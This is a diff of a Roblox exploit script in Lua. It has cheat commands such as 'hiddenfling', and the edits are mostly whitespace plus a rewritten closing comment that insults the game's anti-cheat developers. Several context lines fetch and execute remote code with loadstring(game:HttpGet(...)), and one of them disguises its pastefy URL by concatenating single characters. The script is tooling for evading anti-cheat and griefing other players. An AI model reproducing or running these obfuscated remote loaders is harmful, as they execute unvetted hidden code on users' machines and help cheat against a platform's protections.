@@ -733,7 +733,7 @@ end)
 
 cmd.add({"unhiddenfling", "unhfling"}, {"unhiddenfling (unhfling)", "turn off hiddenfling(walkfling)"}, function()
 hiddenfling = false
-    
+
     wait()
     local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/NotificationUI"))();
     local Notify = AkaliNotif.Notify;
@@ -1207,7 +1207,7 @@ cmd.add({"ebypasser", "eb", "explikit"}, {"explikit (eb, ebypasser)", "loads exp
     })
     --explikitbypasser🔞+
 loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'a'..'B'..'i'..'X'..'w'..'6'..'R'..'C'..'/'..'r'..'a'..'w'), true))()
-    
+
     local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
     Library.DefaultColor = Color3.fromRGB(50,205,50)
     Library:Notification({
@@ -15870,7 +15870,6 @@ end
  end)
 
  --[[
-  End of the sourxe kode.
-  Join the discord for updates or give kommand ideas, that could be added.
-  https://discord.gg/ACk4JyVJ6x
+no kreds to devs  fuxk them for byfron 
+u 100% looked up keyword "byfron"
 --]]
